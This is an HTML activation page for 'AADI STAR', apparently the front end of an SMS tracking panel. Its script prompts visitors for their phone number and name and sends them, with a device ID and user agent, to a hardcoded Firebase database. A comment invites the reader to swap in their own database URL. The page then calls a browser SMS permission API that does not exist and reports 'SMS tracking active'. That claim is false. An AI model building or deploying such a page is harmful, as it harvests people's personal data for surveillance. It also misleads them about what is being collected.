<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AADI STAR - Activate</title>
<style>
body{background:#070c14;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
.card{background:#0f172a;border-radius:20px;padding:30px;text-align:center;max-width:400px;margin:auto}
.logo{color:#00c896;font-size:30px;margin-bottom:10px}
h1{font-size:22px;margin-bottom:10px}
p{color:#94a3b8;margin-bottom:20px}
.btn{background:#00c896;border:none;padding:12px 30px;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;width:100%}
.status{margin-top:15px;padding:10px;border-radius:10px;display:none}
.success{background:#00c89620;color:#00c896}
.error{background:#ef444420;color:#ef4444}
.loader{border:2px solid #00c89620;border-top-color:#00c896;border-radius:50%;width:20px;height:20px;animation:spin 0.8s linear infinite;display:inline-block;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="logo">⭐ AADI STAR</div>
<h1>Activate SMS Tracking</h1>
<p>Click below to start sharing your device data</p>
<button class="btn" onclick="start()">🔐 Activate Now</button>
<div id="status" class="status"></div>
</div>

<script>
// 🔥 APNA FIREBASE URL YAHAN DAALO 🔥
const FIREBASE_URL = "https://aadi-star-panel-default-rtdb.firebaseio.com";

async function start() {
    const statusDiv = document.getElementById('status');
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<div class="loader"></div> Registering device...';
    statusDiv.className = 'status';
    
    let deviceId = localStorage.getItem('deviceId');
    if (!deviceId) {
        deviceId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('deviceId', deviceId);
    }
    
    let phone = localStorage.getItem('phone');
    if (!phone) {
        phone = prompt('Enter your phone number (10 digits):', '');
        if (phone) localStorage.setItem('phone', phone);
    }
    
    let name = localStorage.getItem('name');
    if (!name) {
        name = prompt('Enter your name:', 'User');
        if (name) localStorage.setItem('name', name);
    }
    
    const deviceInfo = {
        deviceId: deviceId,
        phoneNumber: phone,
        name: name,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        status: 'active'
    };
    
    try {
        const res = await fetch(`${FIREBASE_URL}/devices/${deviceId}.json`, {
            method: 'PUT',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(deviceInfo)
        });
        
        if (res.ok) {
            statusDiv.innerHTML = '✅ Device activated successfully!';
            statusDiv.className = 'status success';
            
            if ('sms' in navigator) {
                try {
                    await navigator.sms.requestPermission();
                    statusDiv.innerHTML = '✅ Activated! SMS tracking active.';
                } catch(e) {}
            }
        } else {
            statusDiv.innerHTML = '❌ Activation failed. Try again.';
            statusDiv.className = 'status error';
        }
    } catch(e) {
        statusDiv.innerHTML = '❌ Network error. Check internet.';
        statusDiv.className = 'status error';
    }
}
</script>
</body>
</html>
